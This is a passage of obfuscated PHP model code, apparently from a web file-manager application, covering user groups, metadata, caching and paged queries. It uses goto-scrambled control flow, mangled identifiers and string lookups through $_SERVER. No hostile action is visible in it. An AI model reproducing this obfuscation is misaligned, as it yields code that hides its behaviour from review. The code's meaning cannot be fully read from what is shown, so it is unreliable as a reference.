{ goto EÛãí€Ú¡ó; Eÿ…Ç™û“Õ: $f∏Îøë°¥ª = $this->parseWhereLike($f∏Îøë°¥ª); $Aôó±ªÓŸ« = Model($eÍÀ≠û´‡É[2192])->where($f∏Îøë°¥ª)->limit($Açˆíªƒº±)->select(); if (!$Aôó±ªÓŸ«) { return array(); } goto e……¯®•å™; EÛãí€Ú¡ó: $eÍÀ≠û´‡É =& $_SERVER[’ÿƒ†ïò]; $aÃ◊»©¬ﬂå = strtolower($aÃ◊»©¬ﬂå); $f∏Îøë°¥ª = array($eÍÀ≠û´‡É[93] => $f◊ÿØˆ¬ı√, $eÍÀ≠û´‡É[372] => array($eÍÀ≠û´‡É[381], "\45{$aÃ◊»©¬ﬂå}\x25")); goto Eÿ…Ç™û“Õ; B‡Óöùﬁï¿: return $c¶∫öä÷Ÿ‹; goto bﬂì»Ü∂åõ; e……¯®•å™: $Aôó±ªÓŸ« = array_to_keyvalue($Aôó±ªÓŸ«, $eÍÀ≠û´‡É[33], $eÍÀ≠û´‡É[1557]); $c¶∫öä÷Ÿ‹ = $this->where(array($eÍÀ≠û´‡É[1548] => array($eÍÀ≠û´‡É[7], $Aôó±ªÓŸ«)))->select(); if (!$c¶∫öä÷Ÿ‹) { return array(); } goto B‡Óöùﬁï¿; bﬂì»Ü∂åõ: } private function _listDataApplyItem($cÙòüÈŒÉç) { $e∑´∆Â™ñÈ = array($cÙòüÈŒÉç); $this->_listDataApply($e∑´∆Â™ñÈ); return $e∑´∆Â™ñÈ[0]; } private function _listDataApply(&$AÛ◊ôæœˆÖ) { goto Dü¡àÏıë÷; Dü¡àÏıë÷: $eúÖçîÇ∞¶ =& $_SERVER[’ÿƒ†ïò]; if (!$AÛ◊ôæœˆÖ) { return; } array_remove_key($AÛ◊ôæœˆÖ, $eúÖçîÇ∞¶[879]); goto dıœ≠ÔÂÚ¢; dıœ≠ÔÂÚ¢: $eáóã¥Â¬¯ = array_to_keyvalue($AÛ◊ôæœˆÖ, $eúÖçîÇ∞¶[33], $eúÖçîÇ∞¶[1557]); $this->_listAppendGroup($AÛ◊ôæœˆÖ, $eáóã¥Â¬¯); $this->_listAppendMeta($AÛ◊ôæœˆÖ, $eáóã¥Â¬¯); goto dàüöå»ﬁ√; dàüöå»ﬁ√: $this->_listAppendSourceRoot($AÛ◊ôæœˆÖ, $eáóã¥Â¬¯); goto cƒ«Éœ∫‹È; cƒ«Éœ∫‹È: } private function _listAppendSourceRoot(&$fï’ÒÂ‚É, $bÎˆπ“ñ∑¬) { goto Cí≤û û÷ç; dëôëß”ÚÖ: foreach ($fï’ÒÂ‚É as &$e®…Öë⁄Òà) { $e®…Öë⁄Òà[$e¬æÜåã”[85]] = $càä∏ˆ†πò[$e®…Öë⁄Òà[$e¬æÜåã”[1557]]] ? $càä∏ˆ†πò[$e®…Öë⁄Òà[$e¬æÜåã”[1557]]] : array(); } unset($e®…Öë⁄Òà); goto B˜ø”Ç®á£; Cí≤û û÷ç: $e¬æÜåã” =& $_SERVER[’ÿƒ†ïò]; $E£⁄≈≤É©â = array($e¬æÜåã”[492] => 0, $e¬æÜåã”[498] => array($e¬æÜåã”[7], $bÎˆπ“ñ∑¬), $e¬æÜåã”[406] => SourceModel::TYPE_USER); $BÕÉÙâÇƒ = Model($e¬æÜåã”[820])->order($e¬æÜåã”[1824])->field($e¬æÜåã”[1825]); goto d”„æ‰“ë; d”„æ‰“ë: $càä∏ˆ†πò = $BÕÉÙâÇƒ->limit(count($bÎˆπ“ñ∑¬))->where($E£⁄≈≤É©â)->select(); $càä∏ˆ†πò = array_to_keyvalue($càä∏ˆ†πò, $e¬æÜåã”[498]); $càä∏ˆ†πò = array_remove_key($càä∏ˆ†πò, $e¬æÜåã”[498]); goto dëôëß”ÚÖ; B˜ø”Ç®á£: } private function _listAppendGroup(&$Fì¶ìÑò⁄ß, $c¶èÙ¢ÆÌÓ) { goto a™¥Ìé†Ú≠; DÌ÷áıãûø: $DÏÜæÎ±ê‡ = array_to_keyvalue_group($DÏÜæÎ±ê‡, $FÚãﬁŒ◊Ç¬[1557]); foreach ($DÏÜæÎ±ê‡ as &$F‚∞ºﬂ»°É) { $eˆæ∏‚©ì‘ = array(); foreach ($F‚∞ºﬂ»°É as $DÏ⁄ƒÿ⁄ˆË) { if (!$DÏ⁄ƒÿ⁄ˆË[$FÚãﬁŒ◊Ç¬[1826]]) { continue; } $dè’…íÂıƒ = Model($FÚãﬁŒ◊Ç¬[501])->listData($DÏ⁄ƒÿ⁄ˆË[$FÚãﬁŒ◊Ç¬[1826]]); $eˆæ∏‚©ì‘[] = array($FÚãﬁŒ◊Ç¬[1726] => $DÏ⁄ƒÿ⁄ˆË[$FÚãﬁŒ◊Ç¬[1726]], $FÚãﬁŒ◊Ç¬[2194] => $a∫≤ıñ˘«ê[$DÏ⁄ƒÿ⁄ˆË[$FÚãﬁŒ◊Ç¬[1726]]][$FÚãﬁŒ◊Ç¬[28]], $FÚãﬁŒ◊Ç¬[515] => $a∫≤ıñ˘«ê[$DÏ⁄ƒÿ⁄ˆË[$FÚãﬁŒ◊Ç¬[1726]]][$FÚãﬁŒ◊Ç¬[515]], $FÚãﬁŒ◊Ç¬[408] => $dè’…íÂıƒ); } $F‚∞ºﬂ»°É = $eˆæ∏‚©ì‘; } unset($F‚∞ºﬂ»°É); goto Bí™Èçﬂçû; aÕÊ≤î‹”◊: $AÈ´¯é‰àá = array($FÚãﬁŒ◊Ç¬[1726] => array($FÚãﬁŒ◊Ç¬[7], $BãÈ®áä€Á)); $a∫≤ıñ˘«ê = Model($FÚãﬁŒ◊Ç¬[1901])->field($FÚãﬁŒ◊Ç¬[2193])->where($AÈ´¯é‰àá)->select(); $a∫≤ıñ˘«ê = array_to_keyvalue($a∫≤ıñ˘«ê, $FÚãﬁŒ◊Ç¬[1726]); goto DÌ÷áıãûø; a™¥Ìé†Ú≠: $FÚãﬁŒ◊Ç¬ =& $_SERVER[’ÿƒ†ïò]; $AÈ´¯é‰àá = array($FÚãﬁŒ◊Ç¬[1557] => array($FÚãﬁŒ◊Ç¬[7], $c¶èÙ¢ÆÌÓ)); $DÏÜæÎ±ê‡ = Model($FÚãﬁŒ◊Ç¬[1812])->where($AÈ´¯é‰àá)->select(); goto bå˜«µ”Ãì; bå˜«µ”Ãì: $BãÈ®áä€Á = array_to_keyvalue($DÏÜæÎ±ê‡, $FÚãﬁŒ◊Ç¬[33], $FÚãﬁŒ◊Ç¬[1726]); $BãÈ®áä€Á = array_remove_value(array_unique($BãÈ®áä€Á), $FÚãﬁŒ◊Ç¬[191]); if (!$BãÈ®áä€Á || !$DÏÜæÎ±ê‡) { return; } goto aÕÊ≤î‹”◊; Bí™Èçﬂçû: foreach ($Fì¶ìÑò⁄ß as &$BÃÍéËÇÚ) { $BÃÍéËÇÚ[$FÚãﬁŒ◊Ç¬[1903]] = array(); if (isset($DÏÜæÎ±ê‡[$BÃÍéËÇÚ[$FÚãﬁŒ◊Ç¬[1557]]])) { $BÃÍéËÇÚ[$FÚãﬁŒ◊Ç¬[1903]] = $DÏÜæÎ±ê‡[$BÃÍéËÇÚ[$FÚãﬁŒ◊Ç¬[1557]]]; } } unset($BÃÍéËÇÚ); goto EÁäû”ãéí; EÁäû”ãéí: } public function userAppendGroup($B¿—Ë‘ûô°) { $FÃæãà≈öß =& $_SERVER[’ÿƒ†ïò]; if (!$B¿—Ë‘ûô°) { return array(); } $this->_listAppendGroup($B¿—Ë‘ûô°, array_to_keyvalue($B¿—Ë‘ûô°, $FÃæãà≈öß[33], $FÃæãà≈öß[1557])); return $B¿—Ë‘ûô°; } private function _listAppendMeta(&$CØëÈ≤®¨™, $D…˘Ùàò◊±) { goto FÖøœ”À…õ; cå¢ÚŒˆ“»: foreach ($dÔÎªÏ¢âü as &$b°ûﬂˆÈœÑ) { $c›¥∆ùˆŒÏ = array(); foreach ($b°ûﬂˆÈœÑ as $cç°Êˆß◊Ó) { if (!in_array($cç°Êˆß◊Ó[$E÷Üù∂≤∞Æ[93]], $E öàÈñƒí)) { $c›¥∆ùˆŒÏ[$cç°Êˆß◊Ó[$E÷Üù∂≤∞Æ[93]]] = $cç°Êˆß◊Ó[$E÷Üù∂≤∞Æ[372]]; } } $b°ûﬂˆÈœÑ = $c›¥∆ùˆŒÏ; } unset($b°ûﬂˆÈœÑ); $bÁ“¡Õû î = Model($E÷Üù∂≤∞Æ[2195]); goto dõ≈∂Õâ∫â; EÊÜÌ∞§à: $Dô¡Ìüªﬁ = array($E÷Üù∂≤∞Æ[1557] => array($E÷Üù∂≤∞Æ[7], $D…˘Ùàò◊±)); $dÔÎªÏ¢âü = Model($E÷Üù∂≤∞Æ[2171])->where($Dô¡Ìüªﬁ)->select(); $dÔÎªÏ¢âü = array_to_keyvalue_group($dÔÎªÏ¢âü, $E÷Üù∂≤∞Æ[1557]); goto cå¢ÚŒˆ“»; dõ≈∂Õâ∫â: foreach ($CØëÈ≤®¨™ as &$F¬åÌ†Ÿ¡Ö) { $CπòÚãçŸ· = array(); if (isset($dÔÎªÏ¢âü[$F¬åÌ†Ÿ¡Ö[$E÷Üù∂≤∞Æ[1557]]])) { $CπòÚãçŸ· = $dÔÎªÏ¢âü[$F¬åÌ†Ÿ¡Ö[$E÷Üù∂≤∞Æ[1557]]]; } $F¬åÌ†Ÿ¡Ö[$E÷Üù∂≤∞Æ[2196]] = array(); if (isset($CπòÚãçŸ·[$a©ò∏àÚ¨À])) { $F¬åÌ†Ÿ¡Ö[$E÷Üù∂≤∞Æ[2196]] = $bÁ“¡Õû î->getUserJobInfo($CπòÚãçŸ·[$a©ò∏àÚ¨À]); } } unset($F¬åÌ†Ÿ¡Ö); goto a´õ◊Ì€◊É; FÖøœ”À…õ: $E÷Üù∂≤∞Æ =& $_SERVER[’ÿƒ†ïò]; $a©ò∏àÚ¨À = UserJobModel::JOB_KEY; $E öàÈñƒí = array($E÷Üù∂≤∞Æ[2173]); goto EÊÜÌ∞§à; a´õ◊Ì€◊É: } protected function groupUserAll($A¨©îÊÁ¢´) { $EÚ§πçÍ©© =& $_SERVER[’ÿƒ†ïò]; if (!$A¨©îÊÁ¢´) { return !1; } $F´¶áãÌã‹ = Model($EÚ§πçÍ©©[1812])->field($EÚ§πçÍ©©[1557])->where(array($EÚ§πçÍ©©[1726] => array($EÚ§πçÍ©©[7], $A¨©îÊÁ¢´)))->select(); $F´¶áãÌã‹ = array_to_keyvalue($F´¶áãÌã‹, $EÚ§πçÍ©©[33], $EÚ§πçÍ©©[1557]); return array_unique($F´¶áãÌã‹); } public function userSearch($CÚâ©ó…’â, $fÍ¨à´úì÷ = "\52") { return Model($_SERVER[’ÿƒ†ïò][532])->where($CÚâ©ó…’â)->field($fÍ¨à´úì÷)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\x72\x5f\x6f\160\x74\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($dÏ“î ÃÜç) { $aÕûäÖ∆É® =& $_SERVER[’ÿƒ†ïò]; if (!defined($aÕûäÖ∆É®[468])) { define($aÕûäÖ∆É®[468], 0); } return "\125\x73\145\x72\x4f\x70\x74\151\x6f\x6e\137{$dÏ“î ÃÜç}\137" . USER_ID; } protected function filterWhere($DÇßœ¨ç÷°) { $c∆”≤èó®œ =& $_SERVER[’ÿƒ†ïò]; if (!defined($c∆”≤èó®œ[468])) { define($c∆”≤èó®œ[468], 0); } $DÇßœ¨ç÷°[$c∆”≤èó®œ[1557]] = USER_ID; return $DÇßœ¨ç÷°; } public function cacheRemoveUser($F≠ãèÌÁ∑√, $f…©¶–Öπñ) { return Cache::remove("\125\x73\x65\162\117\160\x74\x69\157\x6e\x5f{$F≠ãèÌÁ∑√}\x5f" . $f…©¶–Öπñ); } protected function optionDefault($cŒëæå≤àÁ = '') { $A«¬âÆêË› =& $_SERVER[’ÿƒ†ïò]; if ($cŒëæå≤àÁ == $A«¬âÆêË›[33]) { return $GLOBALS[$A«¬âÆêË›[6]][$A«¬âÆêË›[2197]]; } if ($cŒëæå≤àÁ == $A«¬âÆêË›[2198]) { return $GLOBALS[$A«¬âÆêË›[6]][$A«¬âÆêË›[2199]]; } } } goto F‘€¿Çë∆É; Añü¢ﬁÎÒÀ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\144\x69\x66\171\x54\151\x6d\x65", "\x74\151\x6d\145", "\x69\x6e\163\x65\162\x74\54\165\160\144\x61\x74\x65", "\146\x75\x6e\143\164\x69\x6f\156"), array("\143\x72\145\141\x74\145\124\151\155\145", "\x74\151\155\145", "\151\156\163\145\x72\164", "\146\x75\x6e\143\164\x69\x6f\x6e")); public function setDataAuto($Cç˘¢ ﬂÀ”) { $this->dataAuto = $Cç˘¢ ﬂÀ”; } public function __construct($cûéƒÜÈò∆ = '', $d‘äÇ°ıΩ∏ = '', $e¥èÑƒÙâ˜ = '') { parent::__construct($cûéƒÜÈò∆, $d‘äÇ°ıΩ∏, $e¥èÑƒÙâ˜); } protected $tableMeta = array(); protected function _beforeInsert(&$CÑ≈≠Û∞ÖÙ, $cú≥¨‹ùÚË) { $dπˆÇ‡Ô•Œ =& $_SERVER[’ÿƒ†ïò]; if (!$this->checkDataAutoHas($dπˆÇ‡Ô•Œ[353])) { return; } $this->dataBeforeFilter($CÑ≈≠Û∞ÖÙ, $dπˆÇ‡Ô•Œ[353]); } protected function _beforeUpdate(&$C˜©ë®â≤‘, $A„∑Ø¡“å) { $EêÊ≤ˆÖÑö =& $_SERVER[’ÿƒ†ïò]; if (!$this->checkDataAutoHas($EêÊ≤ˆÖÑö[354])) { return; } $this->dataBeforeFilter($C˜©ë®â≤‘, $EêÊ≤ˆÖÑö[354]); } protected function _afterSelect(&$B…âØÕ“¯˜, $BÔ¿ø€ΩÚú) { if (!is_array($B…âØÕ“¯˜)) { return; } if (!$this->checkDataAutoHas($_SERVER[’ÿƒ†ïò][355])) { return; } foreach ($B…âØÕ“¯˜ as &$CŸõ©Ω≈æ∑) { $this->dataAfterFilter($CŸõ©Ω≈æ∑); } unset($CŸõ©Ω≈æ∑); } protected function _afterFind(&$b∞†ﬂ´˜∞À, $fÏ±Æ’Ò≤ª) { if (!is_array($b∞†ﬂ´˜∞À)) { return; } if (!$this->checkDataAutoHas($_SERVER[’ÿƒ†ïò][355])) { return; } $this->dataAfterFilter($b∞†ﬂ´˜∞À); } public static function textEncode($A¯ªΩÓî‚ç) { if (!$A¯ªΩÓî‚ç) { return $A¯ªΩÓî‚ç; } $fΩÁ”ÒîÎ° = json_encode($A¯ªΩÓî‚ç); $fΩÁ”ÒîÎ° = preg_replace_callback($_SERVER[’ÿƒ†ïò][356], function ($AÃíéÎóΩò) { return addslashes($AÃíéÎóΩò[0]); }, $fΩÁ”ÒîÎ°); return json_decode($fΩÁ”ÒîÎ°); } public static function textDecode($b∞ä™à¢ô¬) { $b–‰®Â˜⁄í =& $_SERVER[’ÿƒ†ïò]; $F‘¿≠˘…∏â = json_encode($b∞ä™à¢ô¬); $F‘¿≠˘…∏â = preg_replace_callback($b–‰®Â˜⁄í[357], function ($A˜…ÉÊﬂ•°) { return $_SERVER[’ÿƒ†ïò][97]; }, $F‘¿≠˘…∏â); return json_decode($F‘¿≠˘…∏â); } public function setAutoIncrement($d‘∞Ü√ìƒá) { $d´ìÈ·ÛÖÒ = array($this->getPk() => $d‘∞Ü√ìƒá); $CÜÃ∏»ªÆû = $this->data($d´ìÈ·ÛÖÒ)->add(); if ($CÜÃ∏»ªÆû) { $this->delete($CÜÃ∏»ªÆû); } } public function getAutoIncrement() { $F¡èæ…πøÉ = $this->getTableName(); $EŒ«¢èÎÜ™ = $this->max($this->getPk()); $bå⁄ëËé∑® = $this->query("\163\x68\157\167\40\x74\x61\x62\x6c\x65\x20\163\x74\x61\x74\165\x73\40\x77\x68\x65\162\x65\x20\x4e\x61\x6d\x65\x3d\47{$F¡èæ…πøÉ}\x27"); $A™Ñóùè‰ç = $bå⁄ëËé∑®[0][$_SERVER[’ÿƒ†ïò][358]]; $C÷ê˘â≈åÎ = max($EŒ«¢èÎÜ™, $A™Ñóùè‰ç); return $C÷ê˘â≈åÎ; } protected function _callBefore($b·Â†€Âç“, $Eøæùﬂî∂÷) { return $this->cacheCallCheck($b·Â†€Âç“, $Eøæùﬂî∂÷, !1); } protected function _callAfter($C ÈãÚÓ≠á, $CÂ•§£µ—®) { return $this->cacheCallCheck($C ÈãÚÓ≠á, $CÂ•§£µ—®, !0); } protected function cacheFunctionAlias($CáÏ†•ÔÑä) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($cìÉ¡ë†πª, $eöüﬂÂºõ, $f”ÆÑáÜÙñ = false) { $CìçñªÀ∑ú = $this->cacheFunctionAlias($eöüﬂÂºõ); if (!$CìçñªÀ∑ú) { return; } foreach ($CìçñªÀ∑ú as $aﬁÿÃ…®Èê => $c√ò·ÜüêÈ) { $B˜ÉÿÑÁÇÌ = $c√ò·ÜüêÈ[0]; $d’øÔ≤⁄∆Õ = explode($_SERVER[’ÿƒ†ïò][47], $c√ò·ÜüêÈ[1]); if ($cìÉ¡ë†πª == $aﬁÿÃ…®Èê) { return $this->cacheFunctionGet($aﬁÿÃ…®Èê, $B˜ÉÿÑÁÇÌ); } if ($f”ÆÑáÜÙñ && in_array($cìÉ¡ë†πª, $d’øÔ≤⁄∆Õ)) { $this->cacheFunctionClear($aﬁÿÃ…®Èê, $B˜ÉÿÑÁÇÌ); } } } public function cacheFunctionGet($c¶à“’î±î, $F•ôæÑêπï) { $c¡Ï‰Ãè¥º = $this->cacheKeyMake($c¶à“’î±î, $F•ôæÑêπï); $B¬√„Õ€•∞ = Cache::get($c¡Ï‰Ãè¥º); if (!is_array($B¬√„Õ€•∞)) { $B¬√„Õ€•∞ = call_user_func_array(array($this, $c¶à“’î±î), array($F•ôæÑêπï, !0)); Cache::set($c¡Ï‰Ãè¥º, $B¬√„Õ€•∞); } return $B¬√„Õ€•∞; } public function cacheFunctionClear($d≠Èçß¬Ãî, $DöŸõõˆ·´) { $bÜµ⁄í»Àù = $DöŸõõˆ·´; if (!is_array($DöŸõõˆ·´)) { $bÜµ⁄í»Àù = array($DöŸõõˆ·´); } foreach ($bÜµ⁄í»Àù as $DáÆ™¿•‰ı) { $eàô€ëÿ∏í = $this->cacheKeyMake($d≠Èçß¬Ãî, $DáÆ™¿•‰ı); Cache::remove($eàô€ëÿ∏í); } } private function cacheKeyMake($d˘èîÇôã£, $DãÕ©Ù€Ë) { $b÷≠Ç√¡¨Ò =& $_SERVER[’ÿƒ†ïò]; return get_class($this) . $b÷≠Ç√¡¨Ò[71] . $d˘èîÇôã£ . $b÷≠Ç√¡¨Ò[359] . $DãÕ©Ù€Ë; } protected function selectPageReset() { $bóºÈ¥÷√≠ =& $_SERVER[’ÿƒ†ïò]; if (isset($GLOBALS[$bóºÈ¥÷√≠[360]])) { return; } $GLOBALS[$bóºÈ¥÷√≠[360]] = isset($GLOBALS[$bóºÈ¥÷√≠[7]][$bóºÈ¥÷√≠[361]]) ? $GLOBALS[$bóºÈ¥÷√≠[7]][$bóºÈ¥÷√≠[361]] : !1; $GLOBALS[$bóºÈ¥÷√≠[362]] = isset($GLOBALS[$bóºÈ¥÷√≠[7]][$bóºÈ¥÷√≠[351]]) ? $GLOBALS[$bóºÈ¥÷√≠[7]][$bóºÈ¥÷√≠[351]] : !1; $GLOBALS[$bóºÈ¥÷√≠[7]][$bóºÈ¥÷√≠[361]] = !1; $GLOBALS[$bóºÈ¥÷√≠[7]][$bóºÈ¥÷√≠[351]] = !1; } protected function selectPageRestore() { $e™Ó˜÷‹—› =& $_SERVER[’ÿƒ†ïò]; if (!isset($GLOBALS[$e™Ó˜÷‹—›[360]])) { return; } $GLOBALS[$e™Ó˜÷‹—›[7]][$e™Ó˜÷‹—›[361]] = $GLOBALS[$e™Ó˜÷‹—›[360]]; $GLOBALS[$e™Ó˜÷‹—›[7]][$e™Ó˜÷‹—›[351]] = $GLOBALS[$e™Ó˜÷‹—›[362]]; unset($GLOBALS[$e™Ó˜÷‹—›[360]]); unset($GLOBALS[$e™Ó˜÷‹—›[362]]); } protected function selectPage($c≥¿Â‡›·ë = 200, $C´é»¥ÎÊô = 1) { goto C˘îÃΩ∑≥; C®Øè†¬Ö†: $B„Œ›Á›Ò≠ = $f≠◊à‚∑≤è; $B„Œ›Á›Ò≠[$A†èâ±¬Öú[363]] = array(); $c≥¿Â‡›·ë = intval($c≥¿Â‡›·ë); goto Có†¶œ‘èÑ; Có†¶œ‘èÑ: $c≥¿Â‡›·ë = $c≥¿Â‡›·ë <= 5 ? 5 : ($c≥¿Â‡›·ë >= $CÇÑ≠•±É„ ? $CÇÑ≠•±É„ : $c≥¿Â‡›·ë); $C´é»¥ÎÊô = intval(isset($in[$A†èâ±¬Öú[351]]) && $in[$A†èâ±¬Öú[351]] ? $in[$A†èâ±¬Öú[351]] : $C´é»¥ÎÊô); $C´é»¥ÎÊô = $C´é»¥ÎÊô <= 1 ? 1 : $C´é»¥ÎÊô; goto bƒäöÎà¿Ã; a”ß—Ì∆ÜÒ: if (!is_array($bÍÖÓˆ∆†‚)) { $bÍÖÓˆ∆†‚ = array(); } if ($dùü“ˆ¿Úº == 1) { $f√°≥€ÕÑŸ = count($bÍÖÓˆ∆†‚); } $fÀ◊äÎèÙ† = array($A†èâ±¬Öú[364] => array($A†èâ±¬Öú[365] => $f√°≥€ÕÑŸ, $A†èâ±¬Öú[361] => $c≥¿Â‡›·ë, $A†èâ±¬Öú[351] => $C´é»¥ÎÊô, $A†èâ±¬Öú[366] => $dùü“ˆ¿Úº), $A†èâ±¬Öú[367] => $bÍÖÓˆ∆†‚); goto Aêí£¥∞Ûâ; bƒäöÎà¿Ã: $bÍÖÓˆ∆†‚ = array(); $f¢ÀÔÃÆÁı = 1; if ($C´é»¥ÎÊô == 1 && $f¢ÀÔÃÆÁı) { $this->optionsValue($f≠◊à‚∑≤è); $bÍÖÓˆ∆†‚ = $this->page($C´é»¥ÎÊô, $c≥¿Â‡›·ë)->select(); $f√°≥€ÕÑŸ = is_array($bÍÖÓˆ∆†‚) ? count($bÍÖÓˆ∆†‚) : 0; if ($f√°≥€ÕÑŸ < $c≥¿Â‡›·ë) { $dùü“ˆ¿Úº = 1; } else { $this->optionsValue($B„Œ›Á›Ò≠); $f√°≥€ÕÑŸ = intval($this->count()); $dùü“ˆ¿Úº = ceil($f√°≥€ÕÑŸ / $c≥¿Â‡›·ë); } } else { $this->optionsValue($B„Œ›Á›Ò≠); $f√°≥€ÕÑŸ = intval($this->count()); $dùü“ˆ¿Úº = ceil($f√°≥€ÕÑŸ / $c≥¿Â‡›·ë); $C´é»¥ÎÊô = $C´é»¥ÎÊô >= $dùü“ˆ¿Úº ? $dùü“ˆ¿Úº : $C´é»¥ÎÊô; $this->optionsValue($f≠◊à‚∑≤è); $bÍÖÓˆ∆†‚ = $this->page($C´é»¥ÎÊô, $c≥¿Â‡›·ë)->select(); } goto a”ß—Ì∆ÜÒ; C˘îÃΩ∑≥: $A†èâ±¬Öú =& $_SERVER[’ÿƒ†ïò]; global $in; $f≠◊à‚∑≤è = $this->optionsValue(); goto CÂëçŒ¨Ê÷; Aêí£¥∞Ûâ: return $fÀ◊äÎèÙ†; goto A—‘Ö∫ÕüÓ; CÂëçŒ¨Ê÷: $CÇÑ≠•±É„ = 50000; $c≥¿Â‡›·ë = isset($in[$A†èâ±¬Öú[361]]) && $in[$A†èâ±¬Öú[361]] ? $in[$A†èâ±¬Öú[361]] : $c≥¿Â‡›·ë; if ($c≥¿Â‡›·ë === -1) { $in[$A†èâ±¬Öú[361]] = !1; $CÇÑ≠•±É„ = 100000000; $c≥¿Â‡›·ë = $CÇÑ≠•±É„; } goto C®Øè†¬Ö†; A—‘Ö∫ÕüÓ: } protected function checkLength($Fé∂«¿òÍÂ, $d˘∫ò≠àÆ· = 0, $fÖò‚ òÜ∫ = '') { $A‚Çâˆﬂ‹ =& $_SERVER[’ÿƒ†ïò]; $d˘∫ò≠àÆ· = $d˘∫ò≠àÆ· ? $d˘∫ò≠àÆ· : 65536; if (!$Fé∂«¿òÍÂ || strlen($Fé∂«¿òÍÂ) < $d˘∫ò≠àÆ·) { return; } $fÖò‚ òÜ∫ = $fÖò‚ òÜ∫ ? $fÖò‚ òÜ∫ . $A‚Çâˆﬂ‹[68] : $A‚Çâˆﬂ‹[33]; show_json($fÖò‚ òÜ∫ . LNG($A‚Çâˆﬂ‹[368]) . "\50{$d˘∫ò≠àÆ·}\51", !1); } protected function metaSet($EåÙú÷ÖÎ∑, $DçËÖ«Çùπ = null, $AòÀï¶ÿÕ‡ = null) { goto e©Ú´´ÉØ˘; d∫¿›ÖÍé–: if (is_null($DçËÖ«Çùπ)) { return $dœ€Û∞Õ ï->where(array($B“¥ª›ÏπÊ => $EåÙú÷ÖÎ∑))->delete(); } if (is_null($AòÀï¶ÿÕ‡) && is_string($DçËÖ«Çùπ)) { return $dœ€Û∞Õ ï->where($AÂÇûãÎ°›)->delete(); } $eËﬁôÏÜ„´ = is_array($DçËÖ«Çùπ) ? $DçËÖ«Çùπ : array(); goto Dßàœó£ıÎ; b√Êé…º™ò: CacheLock::unlock($Bû˜çª»°ó); return !0; goto AòûÁﬂìûá; e©Ú´´ÉØ˘: $F‹≥¯ûÑ´÷ =& $_SERVER[’ÿƒ†ïò]; if (!$this->tableMeta || !$EåÙú÷ÖÎ∑) { return !1; } $B“¥ª›ÏπÊ = $this->tableMeta[$F‹≥¯ûÑ´÷[369]]; goto d£É¨Ï√†™; E´ÇÊÏÌ⁄Ç: $Bû˜çª»°ó = $F‹≥¯ûÑ´÷[373] . $this->tableMeta; CacheLock::lock($Bû˜çª»°ó); $dœ€Û∞Õ ï->where(array($B“¥ª›ÏπÊ => $EåÙú÷ÖÎ∑))->addAll($aÎÂÖ»ëÙç, array(), !0); goto b√Êé…º™ò; d£É¨Ï√†™: $e÷≤ÇÒÆ¿Ç = $this->tableMeta[$F‹≥¯ûÑ´÷[370]]; $dœ€Û∞Õ ï = Model($e÷≤ÇÒÆ¿Ç); $AÂÇûãÎ°› = array($B“¥ª›ÏπÊ => $EåÙú÷ÖÎ∑, $F‹≥¯ûÑ´÷[371] => $DçËÖ«Çùπ); goto d∫¿›ÖÍé–; Dßàœó£ıÎ: if (is_string($DçËÖ«Çùπ)) { $eËﬁôÏÜ„´[$DçËÖ«Çùπ] = $AòÀï¶ÿÕ‡; } $aÎÂÖ»ëÙç = array(); foreach ($eËﬁôÏÜ„´ as $a∏ä∂êôΩï => $Eø’¿±ÊûÆ) { if (is_null($Eø’¿±ÊûÆ) && is_string($a∏ä∂êôΩï)) { $dœ€Û∞Õ ï->where(array($B“¥ª›ÏπÊ => $EåÙú÷ÖÎ∑, $F‹≥¯ûÑ´÷[371] => $a∏ä∂êôΩï))->delete(); continue; } $this->checkLength($Eø’¿±ÊûÆ, !1, $e÷≤ÇÒÆ¿Ç . $F‹≥¯ûÑ´÷[4] . $a∏ä∂êôΩï); $aÎÂÖ»ëÙç[] = array($B“¥ª›ÏπÊ => $EåÙú÷ÖÎ∑, $F‹≥¯ûÑ´÷[93] => $a∏ä∂êôΩï, $F‹≥¯ûÑ´÷[372] => $Eø’¿±ÊûÆ); } goto E´ÇÊÏÌ⁄Ç; AòûÁﬂìûá: } public function metaGet($føê¥ª≈’, $D©ª¡Ü è˘ = false) { goto c•ÒÑ‰ëÿ–; c•ÒÑ‰ëÿ–: $D§Éò…§»’ =& $_SERVER[’ÿƒ†ïò]; if (!$this->tableMeta) { return array(); } $AΩ∏ÍÃ ⁄‡ = $this->tableMeta[$D§Éò…§»’[369]]; goto c”◊ƒä¶«‚; c”◊ƒä¶«‚: $eª¢£÷Ã‘à = Model($this->tableMeta[$D§Éò…§»’[370]]); if ($D©ª¡Ü è˘) { $eé…’ √çù = array($AΩ∏ÍÃ ⁄‡ => $føê¥ª≈’, $D§Éò…§»’[93] => $D©ª¡Ü è˘); return $eª¢£÷Ã‘à->where($eé…’ √çù)->getField($D§Éò…§»’[372]); } $eé…’ √çù = array($AΩ∏ÍÃ ⁄‡ => $føê¥ª≈’); goto Fƒãõ“¶åª; Fƒãõ“¶åª: $EºÆàòºÁÑ = $eª¢£÷Ã‘à->field($D§Éò…§»’[374])->where($eé…’ √çù)->select(); $EºÆàòºÁÑ = array_to_keyvalue($EºÆàòºÁÑ, $D§Éò…§»’[93], $D§Éò…§»’[372]); return $EºÆàòºÁÑ; goto A§Á®«•Öí; A§Á®«•Öí: } private function checkDataAutoHas($DËÌÑä‹éé) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Fã∂ﬂ„£Üº) { if (in_array($DËÌÑä‹éé, explode($_SERVER[’ÿƒ†ïò][47], $Fã∂ﬂ„£Üº[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$c†‹†¢ÚïÇ, $e‹ó•Ü‰æ≠) { $EçÎäéÃÔÑ =& $_SERVER[’ÿƒ†ïò]; foreach ($this->dataAuto as $C´«Œ›Âæò) { $EÖ˜ú∏ªªˆ = $C´«Œ›Âæò[0]; if (!in_array($e‹ó•Ü‰æ≠, explode($EçÎäéÃÔÑ[47], $C´«Œ›Âæò[2]))) { continue; } switch (trim($C´«Œ›Âæò[3])) { case $EçÎäéÃÔÑ[319]: case $EçÎäéÃÔÑ[320]: $däêã»Óé™ = $C´«Œ›Âæò[1]; $dûŸÑï†Ÿ∂ = isset($C´«Œ›Âæò[4]) ? (array) $C´«Œ›Âæò[4] : array(); if ($däêã»Óé™ == 